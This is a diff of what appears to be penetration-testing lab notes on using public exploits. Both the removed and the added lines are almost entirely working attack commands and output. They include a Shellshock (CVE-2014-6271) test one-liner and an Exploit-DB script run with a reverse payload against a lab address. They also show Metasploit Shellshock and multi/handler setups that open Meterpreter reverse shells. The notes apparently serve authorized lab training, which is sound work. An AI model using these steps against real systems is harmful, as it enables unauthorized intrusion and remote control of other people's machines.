@@ -113,37 +113,29 @@ If no good attack vectors / exploit can be found, try a different or more compre
 
 ### USING EXPLOIT CODE
 
-METHOD #1: MANUAL
-```bash
-env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id	# Src: Github one-liner
-```
+Using the public exploit you found + Metasploit Multi-Handler, you can establish a Meterpreter session with the target.
 
-METHOD #2: EXPLOIT-DB
+Metasploit Handler usage w/ public exploit:
 ```bash
-$ cp /usr/share/exploitdb/platforms/linux/remote/34900.py alpha.py
-$ python alpha.py payload=reverse rhost=10.11.1.71 lhost=10.11.0.31 lport=4444 pages=/cgi-bin/admin.cgi
-10.11.1.71>
-```
-
-METHOD #3: METASPLOIT (NOT PREFERRED)
-```bash
-$ systemctl start postgresql
-$ msfdb init
-$ msfdb start
+# Set up Metasploit Handler
 $ msfconsole
-msf > search shellshock
-msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
-msf exploit(apache_mod_cgi_bash_env_exec) > show options
-. . .
-msf exploit(...) > run
-[*] Started reverse TCP handler on 10.11.0.42:443
-[*] Command Stager progress - 100.46% done (1097/1092 bytes)
-[*] Transmitting intermediate stager...(106 bytes)
-[*] Sending stage (826872 bytes) to 10.11.1.71
-[*] Meterpreter session 1 opened (10.11.0.42:443 -> 10.11.1.71:34930) at 2018-12-18 13:53:55 +1100
-meterpreter > exit
-. . .
-msf exploit(apache_mod_cgi_bash_env_exec) > rerun
+$ msf > use exploit/multi/handler
+$ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+$ msf exploit(handler) > set LHOST 10.11.0.31
+$ msf exploit(handler) > set LPORT 443
+$ msf exploit(handler) > run
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.11.0.31:443 
+
+# Execute Public Exploit:
+$ python exploit.py [ target_ip ]
+
+# Metasploit Handler
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.11.0.31:443 
+[*] Sending stage (179267 bytes) to 10.11.1.5
+[*] Meterpreter session 0 opened (10.11.0.31:443 -> 10.11.1.5:1199) at 2019-01-07 22:46:33 +1100
+meterpreter >
 ```
 
 You will now have reverse shell.
